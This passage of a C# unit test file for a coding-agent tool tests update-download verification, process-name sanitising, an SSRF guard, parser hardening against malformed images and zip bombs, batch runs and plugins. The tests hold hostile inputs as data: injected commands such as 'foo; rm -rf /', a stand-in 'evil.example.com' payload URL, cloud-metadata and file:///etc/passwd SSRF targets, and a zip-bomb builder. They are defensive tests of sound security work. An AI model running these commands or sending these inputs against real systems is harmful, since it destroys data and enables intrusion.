        // ── AppendToLast 追加到最后一条（工具流式输出）──
        slot.BufferedAppendToLast(" 追加");
        Check("并行: AppendToLast 追加到最后一条", slot.ChatMessages[^1].Content == "继续 追加");
    }

    private static void TestWorkModePerAgent(Action<string, bool> Check)
    {
        var savedGlobal = WorkModeManager.CurrentMode;

        // ── 实例级工作模式：与全局 CurrentMode 解耦 ──
        var a1 = new Agent(new LLM("test", "sk-test"));
        var a2 = new Agent(new LLM("test", "sk-test"));
        Check("模式: Agent 默认 Build", a1.WorkMode == WorkMode.Build);
        Check("模式: 两实例可独立设置", a1.WorkMode != a2.WorkMode || a1.WorkMode == WorkMode.Build);

        // 设置实例模式不影响全局镜像
        a1.WorkMode = WorkMode.Plan;
        Check("模式: 实例设 Plan 不影响全局", WorkModeManager.CurrentMode == savedGlobal);
        Check("模式: 实例模式已生效", a1.WorkMode == WorkMode.Plan);
        Check("模式: 另一实例仍 Build", a2.WorkMode == WorkMode.Build);

        // ── 工具约束跟随实例模式 ──
        Check("模式: Plan 阻止 write_file",
            WorkModeManager.CheckToolAllowed("write_file", a1.WorkMode) != null);
        Check("模式: Build 允许 write_file",
            WorkModeManager.CheckToolAllowed("write_file", a2.WorkMode) == null);

        // ── 模式变化回调 ──
        WorkMode? notified = null;
        a1.OnWorkModeChanged = m => notified = m;
        a1.WorkMode = WorkMode.Build;
        a1.OnWorkModeChanged?.Invoke(a1.WorkMode);
        Check("模式: 回调收到新模式", notified == WorkMode.Build);

        // ── 计划审批门纯逻辑（实例模式驱动）──
        Check("模式: Plan 触发审批", Agent.ShouldPromptPlanApproval(WorkMode.Plan, 50));
        Check("模式: Build 不触发审批", !Agent.ShouldPromptPlanApproval(WorkMode.Build, 50));

        WorkModeManager.CurrentMode = savedGlobal;
    }

    private static void TestUpdateChecker(Action<string, bool> Check)
    {
        // ── 语义版本比较 ──
        Check("升级: v0.48.6 < v0.49.0", UpdateChecker.CompareVersions("v0.48.6", "v0.49.0") < 0);
        Check("升级: v0.49.0 > v0.48.6", UpdateChecker.CompareVersions("v0.49.0", "v0.48.6") > 0);
        Check("升级: 相同版本相等", UpdateChecker.CompareVersions("v0.48.6", "v0.48.6") == 0);
        Check("升级: 不同段数相等 (v1.0 vs v1.0.0)", UpdateChecker.CompareVersions("v1.0", "v1.0.0") == 0);
        Check("升级: 后缀忽略 (v2.0.0-beta > v1.9.9)", UpdateChecker.CompareVersions("v2.0.0-beta", "v1.9.9") > 0);
        Check("升级: 大写 V 前缀 (V1.2 < 1.3)", UpdateChecker.CompareVersions("V1.2", "1.3") < 0);
        Check("升级: 数值比较非字典序 (1.10.0 > 1.9.0)", UpdateChecker.CompareVersions("1.10.0", "1.9.0") > 0);

        // ── 当前平台 RID 探测 ──
        var rid = UpdateChecker.DetectCurrentRid();
        Check("升级: RID 非空含连字符", !string.IsNullOrEmpty(rid) && rid.Contains('-'));
        var knownRids = new[] { "win-x64", "win-arm64", "linux-x64", "linux-arm64", "osx-x64", "osx-arm64" };
        Check("升级: RID 属于已知平台", knownRids.Contains(rid));

        // ── 资产名匹配 ──
        var names = new[]
        {
            "waycoder-v0.49.0-win-x64.zip",
            "waycoder-v0.49.0-osx-arm64.tar.gz",
            "waycoder-v0.49.0-linux-x64.tar.gz",
        };
        Check("升级: 匹配 osx-arm64 tar.gz",
            UpdateChecker.FindAssetName(names, "osx-arm64") == "waycoder-v0.49.0-osx-arm64.tar.gz");
        Check("升级: 匹配 win-x64 zip",
            UpdateChecker.FindAssetName(names, "win-x64") == "waycoder-v0.49.0-win-x64.zip");
        Check("升级: 无匹配返回 null",
            UpdateChecker.FindAssetName(names, "linux-arm64") == null);

        // ── 资产 URL 匹配（JSON assets 数组）──
        var assets = JNode.Array()
            .Add(JNode.Object().Set("name", "waycoder-v0.49.0-win-x64.zip").Set("browser_download_url", "https://x/win.zip"))
            .Add(JNode.Object().Set("name", "waycoder-v0.49.0-osx-arm64.tar.gz").Set("browser_download_url", "https://x/osx.tar.gz"));
        Check("升级: 资产 URL 匹配",
            UpdateChecker.FindAssetUrl(assets, "osx-arm64") == "https://x/osx.tar.gz");
        Check("升级: 资产 URL 无匹配 null",
            UpdateChecker.FindAssetUrl(assets, "linux-x64") == null);

        // ── 供应链校验：下载 URL 受信白名单（防 release 注入恶意链接）──
        Check("升级: 受信 URL github.com", UpdateChecker.IsTrustedDownloadUrl("https://github.com/a/b/releases/download/v1/x.tar.gz"));
        Check("升级: 受信 URL gitee.com", UpdateChecker.IsTrustedDownloadUrl("https://gitee.com/a/b/releases/download/v1/x.zip"));
        Check("升级: 受信 URL objects.githubusercontent.com", UpdateChecker.IsTrustedDownloadUrl("https://objects.githubusercontent.com/x/y"));
        Check("升级: http 明文拒绝", !UpdateChecker.IsTrustedDownloadUrl("http://github.com/a/b/x.tar.gz"));
        Check("升级: 非受信 host 拒绝", !UpdateChecker.IsTrustedDownloadUrl("https://evil.example.com/payload.tar.gz"));
        Check("升级: null/空串拒绝", !UpdateChecker.IsTrustedDownloadUrl(null) && !UpdateChecker.IsTrustedDownloadUrl(""));

        // ── 供应链校验：checksums 资产定位 ──
        var assetsWithSum = JNode.Array()
            .Add(JNode.Object().Set("name", "waycoder-v0.49.0-osx-arm64.tar.gz").Set("browser_download_url", "https://github.com/a/b/download/x.tar.gz"))
            .Add(JNode.Object().Set("name", "SHA256SUMS.txt").Set("browser_download_url", "https://github.com/a/b/download/SHA256SUMS.txt"));
        Check("升级: 定位 SHA256SUMS.txt", UpdateChecker.FindChecksumUrl(assetsWithSum) == "https://github.com/a/b/download/SHA256SUMS.txt");
        Check("升级: 无校验文件返回 null", UpdateChecker.FindChecksumUrl(assets) == null);

        // ── 供应链校验：SHA256SUMS 解析 ──
        var sums =
            "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad  waycoder-a.tar.gz\n" +
            "# 注释行应被忽略\n" +
            "0000000000000000000000000000000000000000000000000000000000000000 *waycoder-b.zip\n" +
            "\n" +
            "BADLINE\n";
        var sumMap = UpdateChecker.ParseChecksums(sums);
        Check("升级: 解析出两条记录", sumMap.Count == 2);
        Check("升级: 普通格式键值正确", sumMap["waycoder-a.tar.gz"] == "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
        Check("升级: 二进制 * 前缀剥离", sumMap["waycoder-b.zip"] == "0000000000000000000000000000000000000000000000000000000000000000");
        Check("升级: 忽略注释/空行/坏行", !sumMap.ContainsKey("BADLINE") && !sumMap.ContainsKey(""));

        // ── 供应链校验：文件 SHA256 计算 ──
        var shaTmp = Path.Combine(Path.GetTempPath(), "waycoder-test-sha-" + rid + ".bin");
        File.WriteAllText(shaTmp, "abc");
        try
        {
            Check("升级: SHA256('abc') 正确",
                UpdateChecker.ComputeSha256Hex(shaTmp) == "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
        }
        finally { try { File.Delete(shaTmp); } catch { } }
    }

    private static void TestProcessTools(Action<string, bool> Check)
    {
        // ── 进程名安全白名单（防 shell 命令注入）──
        Check("kill: 合法名 node", KillTool.IsSafeProcessName("node"));
        Check("kill: 合法名 dotnet", KillTool.IsSafeProcessName("dotnet"));
        Check("kill: 合法名含空格", KillTool.IsSafeProcessName("Google Chrome"));
        Check("kill: 合法名含点", KillTool.IsSafeProcessName("python3.11"));
        Check("kill: 合法名含连字符/下划线", KillTool.IsSafeProcessName("foo-bar_baz"));
        Check("kill: 空串拒绝", !KillTool.IsSafeProcessName(""));
        Check("kill: 空白拒绝", !KillTool.IsSafeProcessName("   "));
        Check("kill: 分号注入拒绝", !KillTool.IsSafeProcessName("foo; rm -rf /"));
        Check("kill: 管道注入拒绝", !KillTool.IsSafeProcessName("foo|bar"));
        Check("kill: 命令替换拒绝", !KillTool.IsSafeProcessName("foo$(rm -rf /)"));
        Check("kill: 反引号拒绝", !KillTool.IsSafeProcessName("foo`bar`"));
        Check("kill: 重定向拒绝", !KillTool.IsSafeProcessName("foo>bar"));
        Check("kill: 换行注入拒绝", !KillTool.IsSafeProcessName("foo\nbar"));

        // ── kill 工具注入拦截（不执行真实命令，早退返回错误）──
        Check("kill: 非法进程名拦截",
            new KillTool().ExecuteAsync(new() { ["name"] = "foo; rm -rf /" }).Result.Contains("非法字符"));
        Check("kill: 空进程名拦截",
            new KillTool().ExecuteAsync(new() { ["name"] = "" }).Result.Contains("不能为空"));
        Check("kill: 系统关键进程拦截",
            new KillTool().ExecuteAsync(new() { ["name"] = "System" }).Result.Contains("系统关键进程"));
        Check("kill: 缺失参数提示",
            new KillTool().ExecuteAsync(new() { }).Result.Contains("必须指定"));

        // ── ps 工具注入拦截 ──
        Check("ps: 非法进程名拦截",
            new PsTool().ExecuteAsync(new() { ["name"] = "foo; rm -rf /" }).Result.Contains("非法字符"));
    }

    private static void TestSsgfGuard(Action<string, bool> Check)
    {
        // ── IP 内网/保留地址判断 ──
        Check("SSRF: 127.0.0.1 环回", SsgfGuard.IsPrivateIp("127.0.0.1"));
        Check("SSRF: 10.0.0.1 私网", SsgfGuard.IsPrivateIp("10.0.0.1"));
        Check("SSRF: 172.16.0.1 私网", SsgfGuard.IsPrivateIp("172.16.0.1"));
        Check("SSRF: 172.31.255.255 私网上界", SsgfGuard.IsPrivateIp("172.31.255.255"));
        Check("SSRF: 192.168.1.1 私网", SsgfGuard.IsPrivateIp("192.168.1.1"));
        Check("SSRF: 169.254.169.254 云元数据", SsgfGuard.IsPrivateIp("169.254.169.254"));
        Check("SSRF: 100.64.0.1 CGNAT", SsgfGuard.IsPrivateIp("100.64.0.1"));
        Check("SSRF: 0.0.0.0 保留", SsgfGuard.IsPrivateIp("0.0.0.0"));
        Check("SSRF: 224.0.0.1 组播", SsgfGuard.IsPrivateIp("224.0.0.1"));
        Check("SSRF: ::1 IPv6 环回", SsgfGuard.IsPrivateIp("::1"));
        Check("SSRF: fc00::1 ULA", SsgfGuard.IsPrivateIp("fc00::1"));
        Check("SSRF: fe80::1 链路本地", SsgfGuard.IsPrivateIp("fe80::1"));
        Check("SSRF: 8.8.8.8 公网放行", !SsgfGuard.IsPrivateIp("8.8.8.8"));
        Check("SSRF: 1.1.1.1 公网放行", !SsgfGuard.IsPrivateIp("1.1.1.1"));
        Check("SSRF: 114.114.114.114 公网放行", !SsgfGuard.IsPrivateIp("114.114.114.114"));
        Check("SSRF: 172.15.0.1 边界外公网", !SsgfGuard.IsPrivateIp("172.15.0.1"));
        Check("SSRF: 172.32.0.1 边界外公网", !SsgfGuard.IsPrivateIp("172.32.0.1"));

        // ── URL 校验 ──
        Check("SSRF: 公网 URL 放行", SsgfGuard.CheckUrl("https://example.com/docs").safe);
        Check("SSRF: 内网 IP URL 拦截", !SsgfGuard.CheckUrl("http://127.0.0.1:8080/admin").safe);
        Check("SSRF: 云元数据 URL 拦截", !SsgfGuard.CheckUrl("http://169.254.169.254/latest/meta-data/").safe);
        Check("SSRF: 内网段 URL 拦截", !SsgfGuard.CheckUrl("http://192.168.1.1/").safe);
        Check("SSRF: 10 段 URL 拦截", !SsgfGuard.CheckUrl("http://10.0.0.5:3000/").safe);
        Check("SSRF: localhost 拦截", !SsgfGuard.CheckUrl("http://localhost:3000/").safe);
        Check("SSRF: 内部域名拦截", !SsgfGuard.CheckUrl("http://db.internal/api").safe);
        Check("SSRF: file:// 拦截", !SsgfGuard.CheckUrl("file:///etc/passwd").safe);
        Check("SSRF: ftp:// 拦截", !SsgfGuard.CheckUrl("ftp://example.com/x").safe);
        Check("SSRF: IPv6 环回 URL 拦截", !SsgfGuard.CheckUrl("http://[::1]:8080/").safe);

        // ── 重定向状态码判断 ──
        Check("SSRF: 301 是重定向", SsgfGuard.IsRedirect(301));
        Check("SSRF: 302 是重定向", SsgfGuard.IsRedirect(302));
        Check("SSRF: 303 是重定向", SsgfGuard.IsRedirect(303));
        Check("SSRF: 307 是重定向", SsgfGuard.IsRedirect(307));
        Check("SSRF: 308 是重定向", SsgfGuard.IsRedirect(308));
        Check("SSRF: 200 非重定向", !SsgfGuard.IsRedirect(200));
        Check("SSRF: 404 非重定向", !SsgfGuard.IsRedirect(404));
    }

    /// <summary>P1 批次：崩溃/健壮性加固（递归深度、死循环、不可信尺寸字段 OOM 防护）测试。</summary>
    private static void TestP1Hardening(Action<string, bool> Check)
    {
        // ── P1-1 PDF 深层嵌套字典/数组防栈溢出（护栏 128 层）──
        var deepPdf = BuildNestedPdf(10000);
        var deepParser = PdfParser.Open(deepPdf);
        Check("Pdf: 万级嵌套数组不栈溢出（返回解析器）", deepParser != null);

        // ── P1-2 PNG 负数 chunk 长度防死循环 ──
        var pngNeg = new byte[16];
        new byte[] { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A }.CopyTo(pngNeg, 0);
        pngNeg[8] = 0x80; // len = 0x80000000（BE32 读作负数）
        bool pngNegThrew = false;
        try { PngDecoder.Decode(pngNeg); } catch (FormatException) { pngNegThrew = true; }
        Check("Png: 负数 chunk 长度报错（不死循环）", pngNegThrew);

        // ── P1-2 DrawCanvas 圆/椭圆 NaN/Inf/超大半径防死循环 ──
        bool fillOk = true;
        try
        {
            var c1 = new Canvas(100, 100, 0xFFFFFFFF);
            c1.FillCircle(50, 50, double.NaN, 0xFF000000);
            c1.FillCircle(50, 50, 1e300, 0xFF000000);
            var c2 = new Canvas(100, 100, 0xFFFFFFFF);
            c2.FillEllipse(50, 50, double.PositiveInfinity, 5, 0xFF000000);
            c2.FillEllipse(50, 50, 5, double.NegativeInfinity, 0xFF000000);
            c2.FillEllipse(50, 50, 0, 5, 0xFF000000);
        }
        catch { fillOk = false; }
        Check("Draw: 圆/椭圆 NaN/Inf/超大半径不崩", fillOk);

        // ── P1-3 PNG 超大尺寸防 OOM ──
        var pngBig = new byte[33];
        new byte[] { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A }.CopyTo(pngBig, 0);
        pngBig[11] = 13; // IHDR 长度
        Encoding.ASCII.GetBytes("IHDR").CopyTo(pngBig, 12);
        pngBig[18] = 0xFF; pngBig[19] = 0xFF; // width = 65535
        pngBig[22] = 0xFF; pngBig[23] = 0xFF; // height = 65535
        pngBig[24] = 8; pngBig[25] = 6; // bitDepth=8, colorType=RGBA
        bool pngBigThrew = false;
        try { PngDecoder.Decode(pngBig); } catch (FormatException) { pngBigThrew = true; }
        Check("Png: 超大尺寸报错（防 OOM）", pngBigThrew);

        // ── P1-3 BMP 超大尺寸防 OOM ──
        var bmpBig = new byte[54];
        bmpBig[0] = (byte)'B'; bmpBig[1] = (byte)'M';
        W32(bmpBig, 10, 54);      // dataOffset
        W32(bmpBig, 14, 40);      // dibSize
        W32(bmpBig, 18, 65535);   // width
        W32(bmpBig, 22, 65535);   // height
        W16(bmpBig, 28, 24);      // bpp
        W32(bmpBig, 30, 0);       // BI_RGB
        bool bmpBigThrew = false;
        try { BmpCodec.Decode(bmpBig); } catch (FormatException) { bmpBigThrew = true; }
        Check("Bmp: 超大尺寸报错（防 OOM）", bmpBigThrew);

        // ── P1-3 JPEG 超大尺寸 / 非法分量数 / 非法采样因子 ──
        var jpegBig = new byte[]
        {
            0xFF, 0xD8,                       // SOI
            0xFF, 0xC0, 0x00, 0x0B, 8,       // SOF0: len=11, precision=8
            0xFF, 0xFF, 0xFF, 0xFF,          // height=65535, width=65535
            1, 1, 0x11, 0,                   // nComp=1, comp[0] id=1 hv=0x11 qid=0
            0xFF, 0xDA, 0x00, 0x08, 1,       // SOS: len=8, n=1
            1, 0x00, 0, 0x3F, 0,             // comp id=1 hf=0, Ss=0 Se=63 AhAl=0
            0x00, 0x00, 0xFF, 0xD9,          // 熵数据 + EOI
        };
        bool jpegBigThrew = false;
        try { JpegCodec.Decode(jpegBig); } catch (FormatException) { jpegBigThrew = true; }
        Check("Jpeg: 超大尺寸报错（防 OOM）", jpegBigThrew);

        // 非法分量数 nComp=5
        var jpegNComp = new List<byte> { 0xFF, 0xD8, 0xFF, 0xC0, 0x00, 0x17, 8, 0, 16, 0, 16, 5 };
        for (int i = 0; i < 5; i++) { jpegNComp.Add(1); jpegNComp.Add(0x11); jpegNComp.Add(0); }
        bool jpegNCompThrew = false;
        try { JpegCodec.Decode(jpegNComp.ToArray()); } catch (FormatException) { jpegNCompThrew = true; }
        Check("Jpeg: 非法分量数报错", jpegNCompThrew);

        // 非法采样因子 hv=0x05（hh=0）
        var jpegHv = new List<byte> { 0xFF, 0xD8, 0xFF, 0xC0, 0x00, 0x0B, 8, 0, 16, 0, 16, 1, 1, 0x05, 0 };
        bool jpegHvThrew = false;
        try { JpegCodec.Decode(jpegHv.ToArray()); } catch (FormatException) { jpegHvThrew = true; }
        Check("Jpeg: 非法采样因子报错", jpegHvThrew);

        // ── P1-3 DrawEngine 超大画布防 OOM ──
        var bigCanvas = DrawRunner.Parse("canvas 100000 100000\nrect 0 0 10 10");
        Check("Draw: 超大画布报错", bigCanvas.Error != null);
        Check("Draw: 超大画布保留默认尺寸", bigCanvas.Width == 800 && bigCanvas.Height == 600);

        // ── P1-3 CFB 超大 Size 字段钳制到文件大小 ──
        var cfbHuge = BuildCfb(("S", Encoding.ASCII.GetBytes("hi")));
        W64(cfbHuge, 1024 + 128 + 120, 0xFFFFFFFFUL); // 目录扇区 1 → offset 1024，流条目 di=1 → +128，size 字段 +120
        var hugeDoc = CfbParser.Open(cfbHuge);
        Check("Wps: 超大 Size 字段仍可解析", hugeDoc != null);
        var hugeStream = hugeDoc?.GetStream("S");
        Check("Wps: 超大 Size 流长度被钳制", hugeStream != null && hugeStream.Length <= cfbHuge.Length);

        // ── P1-3 Office zip bomb 防 OOM ──
        var bombPath = Path.Combine(Path.GetTempPath(), "wc_bomb_" + Guid.NewGuid().ToString("N")[..6] + ".docx");
        try
        {
            using (var fs = File.Create(bombPath))
            using (var zip = new ZipArchive(fs, ZipArchiveMode.Create))
            {
                var entry = zip.CreateEntry("word/document.xml");
                using var es = entry.Open();
                var chunk = new byte[1024 * 1024];
                Array.Fill(chunk, (byte)'A');
                for (int i = 0; i < 65; i++) es.Write(chunk, 0, chunk.Length); // 65MB 高度可压缩
            }
            var bombResult = OfficeExtractor.ExtractDocx(bombPath);
            Check("Office: zip bomb 报错不 OOM", bombResult.Contains("错误") || bombResult.Contains("zip bomb"));
        }
        finally { try { File.Delete(bombPath); } catch { } }
    }

    /// <summary>构造带深度嵌套数组（depth 层）的最小 PDF，用于验证解析器防栈溢出护栏。</summary>
    private static byte[] BuildNestedPdf(int depth)
    {
        var bytes = new List<byte>();
        void Add(string s) => bytes.AddRange(Encoding.ASCII.GetBytes(s));

        Add("%PDF-1.4\n");
        var offsets = new long[4];
        offsets[1] = bytes.Count;
        Add("1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n");
        offsets[2] = bytes.Count;
        Add("2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n");
        offsets[3] = bytes.Count;
        Add("3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n");

        var xrefPos = bytes.Count;
        Add("xref\n0 4\n");
        Add("0000000000 65535 f \n");
        for (int i = 1; i <= 3; i++)
            Add($"{offsets[i]:D10} 00000 n \n");

        Add("trailer\n<< /Size 4 /Root 1 0 R /Deep ");
        Add(new string('[', depth));
        Add("1");
        Add(new string(']', depth));
        Add(" >>\nstartxref\n" + xrefPos + "\n%%EOF\n");

        return bytes.ToArray();
    }

    private static void TestBatchEngine(Action<string, bool> Check)
    {
        // ── JSON 解析 ──
        var ok = BatchSpec.Parse("""
        {
          "maxParallel": 2,
          "tasks": [
            { "repo": "https://github.com/a/b", "task": "修 bug" },
            { "repo": "/本地/x", "task": "加测试", "name": "x", "branch": "dev" }
          ]
        }
        """, out var err1);
        Check("批量: 解析 2 个任务", ok != null && ok.Jobs.Count == 2 && err1 == "");
        Check("批量: maxParallel=2", ok!.MaxParallel == 2);
        Check("批量: name/branch 透传", ok.Jobs[1].Name == "x" && ok.Jobs[1].Branch == "dev");

        // ── 边界与钳制 ──
        var clamp = BatchSpec.Parse("""{ "maxParallel": 99, "timeoutSec": 1, "tasks": [{"repo":"r","task":"t"}] }""", out _);
        Check("批量: maxParallel 钳制到 16", clamp!.MaxParallel == 16);
        Check("批量: timeoutSec 钳制到 60", clamp.TimeoutSec == 60);
        var clamp2 = BatchSpec.Parse("""{ "maxParallel": 0, "tasks": [{"repo":"r","task":"t"}] }""", out _);
        Check("批量: maxParallel 钳制到 1", clamp2!.MaxParallel == 1);

        // ── 错误场景 ──
        Check("批量: 缺 tasks 报错", BatchSpec.Parse("""{"maxParallel":2}""", out var e1) == null && e1.Contains("tasks"));
        Check("批量: 非法 JSON 报错", BatchSpec.Parse("not json", out var e2) == null && e2.Contains("JSON"));
        Check("批量: 空任务报错", BatchSpec.Parse("""{"tasks":[]}""", out var e3) == null && e3.Length > 0);

        // ── SanitizeName ──
        Check("批量: URL 提取名", BatchSpec.SanitizeName("https://github.com/org/my-repo.git") == "my-repo");
        Check("批量: 本地路径提取名", BatchSpec.SanitizeName("/a/b/c") == "c");
        Check("批量: 反斜杠路径提取名", BatchSpec.SanitizeName("C:\\proj\\repo") == "repo");
        Check("批量: 空名兜底", BatchSpec.SanitizeName("///") == "repo");
        Check("批量: 非法字符替换", BatchSpec.SanitizeName("my repo!") == "my_repo");

        // ── IsRemoteUrl ──
        Check("批量: https 是远程", BatchSpec.IsRemoteUrl("https://x/y"));
        Check("批量: git@ 是远程", BatchSpec.IsRemoteUrl("git@github.com:o/r.git"));
        Check("批量: 本地路径非远程", !BatchSpec.IsRemoteUrl("/local/path"));

        // ── FromRepos ──
        var spec = BatchSpec.FromRepos(new[] { "https://a/b", "/local/c" }, "共享任务");
        Check("批量: FromRepos 构建 2 任务", spec.Jobs.Count == 2 && spec.Jobs.All(j => j.Task == "共享任务"));

        // ── 报告渲染 ──
        var report = new BatchReport();
        report.Results.Add(new BatchResult { Name = "a", Repo = "r", Success = true, Summary = "完成", DurationMs = 1000 });
        report.Results.Add(new BatchResult { Name = "b", Repo = "r2", Success = false, Error = "挂了", ExitCode = 1, DurationMs = 2000 });
        var md = report.ToMarkdown();
        Check("批量: 报告含统计", md.Contains("总计: 2") && md.Contains("成功: 1") && md.Contains("失败: 1"));
        Check("批量: 报告含成功/失败图标", md.Contains("✅") && md.Contains("❌"));
        Check("批量: 报告含错误详情", md.Contains("挂了"));

        // ── RunAsync 端到端（本地 git 仓库 + 注入 fake spawner，无网络无 LLM）──
        try
        {
            var gitOk = GitRunner.Run("--version").ExitCode == 0;
            Check("批量: git 可用（端到端前提）", gitOk);
            if (gitOk)
            {
                var srcDir = Path.Combine(Path.GetTempPath(), "wc_batch_src_" + Guid.NewGuid().ToString("N")[..6]);
                var rootDir = Path.Combine(Path.GetTempPath(), "wc_batch_root_" + Guid.NewGuid().ToString("N")[..6]);
                Directory.CreateDirectory(srcDir);
                GitRunner.RunOrThrow("init -q", srcDir);
                File.WriteAllText(Path.Combine(srcDir, "a.txt"), "hi");
                GitRunner.RunOrThrow("add -A", srcDir);
                GitRunner.RunOrThrow("-c user.email=t@t -c user.name=t commit -q -m init", srcDir);

                var spec2 = BatchSpec.FromRepos(new[] { srcDir, srcDir }, "任务", maxParallel: 2);
                spec2.TimeoutSec = 60;
                spec2.KeepResults = false;

                var ran = 0;
                var report2 = BatchRunner.RunAsync(spec2,
                    log: null,
                    rootDir: rootDir,
                    spawn: (job, dir, task, ct) =>
                    {
                        Interlocked.Increment(ref ran);
                        var cloned = File.Exists(Path.Combine(dir, "a.txt"));
                        return Task.FromResult<(int, string, string)>(cloned ? (0, $"OK {job.DisplayName}", "") : (1, "", "clone 未就绪"));
                    }).GetAwaiter().GetResult();

                Check("批量: RunAsync 并发执行 2 任务", ran == 2);
                Check("批量: RunAsync 全部成功", report2.Succeeded == 2 && report2.Failed == 0);
                Check("批量: 报告已写文件", File.Exists(Path.Combine(rootDir, "batch-report.md")));
                Check("批量: 工作副本已清理", !Directory.Exists(Path.Combine(rootDir, "jobs")) || Directory.GetDirectories(Path.Combine(rootDir, "jobs")).Length == 0);

                // 清理临时目录
                try { Directory.Delete(srcDir, recursive: true); } catch { }
                try { Directory.Delete(rootDir, recursive: true); } catch { }
            }
        }
        catch (Exception ex)
        {
            Check($"批量: RunAsync 端到端异常: {ex.Message}", false);
        }
    }

    // ── 插件系统测试用最小实现 ──

    private sealed class TestPluginTool : ITool
    {
        public string Name => "plugin_test_tool";
        public string Description => "测试插件工具";
        public JNode Parameters => JNode.Object().Set("type", "object").Set("properties", JNode.Object());
        public Task<string> ExecuteAsync(Dictionary<string, object?> arguments) => Task.FromResult("ok");
    }

    private sealed class TestPluginCommand : SlashCommand
    {
        public override string Name => "/plugin-hello";
        public override string Description => "测试插件命令";
        public override Task ExecuteAsync(string args, ChatScreen screen) => Task.CompletedTask;
    }

    private sealed class TestPlugin : Plugin
    {
        public override string Name => "test-plugin";
        public override string Version => "9.9.9";
        public override IEnumerable<ITool> GetTools() => [new TestPluginTool()];
        public override IEnumerable<ISlashCommand> GetCommands() => [new TestPluginCommand()];
    }

    private sealed class NullReturningPlugin : Plugin
    {
        public override string Name => "null-plugin";
        public override IEnumerable<ITool> GetTools() => null!;
        public override IEnumerable<ISlashCommand> GetCommands() => null!;
    }

    private static void TestPluginSystem(Action<string, bool> Check)
    {
        PluginRegistry.Register(new TestPlugin());
        Check("插件: 注册成功", PluginRegistry.Plugins.Count == 1);
        Check("插件: 收集 1 个工具", PluginRegistry.CollectTools().Count() == 1);
        Check("插件: 收集 1 个命令", PluginRegistry.CollectCommands().Count() == 1);
        Check("插件: 工具集成到 AllTools", ToolRegistry.AllTools.Any(t => t.Name == "plugin_test_tool"));
        Check("插件: 命令名正确", PluginRegistry.CollectCommands().First().Name == "/plugin-hello");

        // 同名覆盖（忽略大小写）不重复
        PluginRegistry.Register(new TestPlugin());
        Check("插件: 同名注册覆盖不重复", PluginRegistry.Plugins.Count == 1);
        Check("插件: 版本字段保留", PluginRegistry.Plugins[0].Version == "9.9.9");

        // null 注册防御
        PluginRegistry.Register(null!);
        Check("插件: null 注册不抛", PluginRegistry.Plugins.Count == 1);

        // 卸载
        Check("插件: 卸载成功", PluginRegistry.Unregister("test-plugin"));
        Check("插件: 卸载后工具移除", PluginRegistry.Plugins.Count == 0
            && !ToolRegistry.AllTools.Any(t => t.Name == "plugin_test_tool"));

        // null 返回防御
        PluginRegistry.Register(new NullReturningPlugin());
        Check("插件: null 返回防御不抛", PluginRegistry.CollectTools().Count() == 0
            && PluginRegistry.CollectCommands().Count() == 0);
        PluginRegistry.Unregister("null-plugin");
    }

    private static void TestJsonMode(Action<string, bool> Check)
    {
        // ── 成功结果 ──
        var ok = JsonResult.Build(
            success: true,
            answer: "任务完成",
            error: null,
            model: "deepseek-v4-pro",
            promptTokens: 100,
            completionTokens: 50,
            costUsd: 0.00123,
            durationMs: 2048,
            changedFiles: new[] { "a.cs", "b.cs" });

        Check("JSON: success=true", ok["success"]!.AsBool() == true);
        Check("JSON: answer 透传", ok["answer"]!.AsString() == "任务完成");
        Check("JSON: error 为 null", ok["error"]!.IsNull);
        Check("JSON: model 透传", ok["model"]!.AsString() == "deepseek-v4-pro");
        Check("JSON: usage.total = prompt+completion",
            (int)ok["usage"]!["total_tokens"]!.AsNumber() == 150);
        Check("JSON: cost_usd 保留", Math.Abs(ok["cost_usd"]!.AsNumber() - 0.00123) < 1e-9);
        Check("JSON: duration_ms", (long)ok["duration_ms"]!.AsNumber() == 2048);
        Check("JSON: changed_files 数组", ok["changed_files"] is JNode { Kind: JKind.Array } arr && arr.Count == 2);
        Check("JSON: 序列化可解析", Json.Parse(ok.ToJson()) is JNode { Kind: JKind.Object });

        // ── 失败结果 ──
        var fail = JsonResult.Build(false, "", "请求超时", "m", 0, 0, null, 1, null);
        Check("JSON: success=false", fail["success"]!.AsBool() == false);
        Check("JSON: error 透传", fail["error"]!.AsString() == "请求超时");
        Check("JSON: answer 空串兜底", fail["answer"]!.AsString() == "");
        Check("JSON: cost_usd null", fail["cost_usd"]!.IsNull);
        Check("JSON: changed_files 空数组", fail["changed_files"] is JNode { Kind: JKind.Array } e && e.Count == 0);
    }

    /// <summary>智能重试策略（RetryPolicy）单元测试：异常过滤 + 指数退避 + 重试耗尽。</summary>
    private static void TestRetryPolicy(Action<string, bool> Check)
    {
        // ── ShouldRetry 黑名单（默认禁止的参数/状态异常）──
        Check("Retry: 黑名单拒 ArgumentException",
            !new RetryConfig().ShouldRetry(new ArgumentException("x")));
        Check("Retry: 黑名单拒 OperationCanceledException",
            !new RetryConfig().ShouldRetry(new OperationCanceledException()));
        Check("Retry: 黑名单拒 InvalidOperationException",
            !new RetryConfig().ShouldRetry(new InvalidOperationException()));
        Check("Retry: 默认允许 IOException（瞬时错误）",
            new RetryConfig().ShouldRetry(new IOException("x")));

        // ── 白名单：只重试指定类型 ──
        var whitelist = new RetryConfig
        {
            RetryableExceptions = new HashSet<string> { "System.IO.IOException" },
        };
        Check("Retry: 白名单命中 IOException 重试", whitelist.ShouldRetry(new IOException("x")));
        Check("Retry: 白名单未命中 TimeoutException 不重试",
            !whitelist.ShouldRetry(new TimeoutException("x")));

        // ── RetryAsync：首次成功不重试 ──
        var attempts = 0;
        var ok = RetryPolicy.RetryAsync<int>(() => Task.FromResult(++attempts), new RetryConfig { MaxRetries = 3 })
            .GetAwaiter().GetResult();
        Check("Retry: 首次成功不重试", ok == 1 && attempts == 1);

        // ── RetryAsync：失败 N 次后成功 ──
        var attempts2 = 0;
        var ok2 = RetryPolicy.RetryAsync<int>(() =>
        {
            attempts2++;
            if (attempts2 < 3) throw new IOException("瞬时错误");
            return Task.FromResult(42);
